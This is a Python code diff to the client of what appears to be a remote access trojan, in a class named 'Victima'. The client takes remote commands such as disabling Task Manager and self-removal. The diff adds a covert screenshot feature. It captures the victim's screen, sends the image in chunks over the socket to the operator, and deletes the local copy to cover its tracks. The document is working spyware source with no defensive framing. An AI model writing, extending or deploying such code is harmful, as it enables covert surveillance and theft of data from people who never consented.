@@ -5,13 +5,15 @@ import re
 import os
 import sys
 import time
-import socket
 import json
 import ctypes
+import socket
 import argparse
 import platform
-import subprocess
+import datetime
 import threading
+import subprocess
+import pyscreenshot
 import urllib.request
 from getpass import getuser
 
@@ -157,6 +159,9 @@ class Victima(object):
 			elif (datosEleccion=="taskManagerDisable"):
 				self.taskManagerDisable()
 
+			elif (datosEleccion=="screenshot"):
+				self.screenshot()
+
 			# RED	
 
 			elif (datosEleccion=="ifconfig"):
@@ -269,6 +274,35 @@ class Victima(object):
 	def autoremover(self):
 		proceso,msg = autoremover.activar(plataforma)
 		self.enviar(msg)
+		return
+
+
+	def screenshot(self):
+		# Recibe y envia el mensaje de "ok" del modo 
+		self.enviar('ok')
+
+		data = datetime.datetime.today()
+		nombre_archivo = getuser()+'_'+str(data.day)+str(data.month)+str(data.year)+"-"+str(data.hour)+str(data.minute)+str(data.second)+".png"
+
+		captura = pyscreenshot.grab()
+		captura.save(nombre_archivo)
+
+		self.recibir()
+		self.enviar(nombre_archivo)
+
+		self.recibir()
+		self.enviar(str(os.path.getsize(nombre_archivo)))
+
+
+		with open(nombre_archivo,"rb") as archivo:
+			contenido = archivo.read(1024)
+			while (contenido):
+				self.client.send(contenido)
+				contenido = archivo.read(1024)
+
+		os.remove(nombre_archivo)
+
+
 		return
 
 
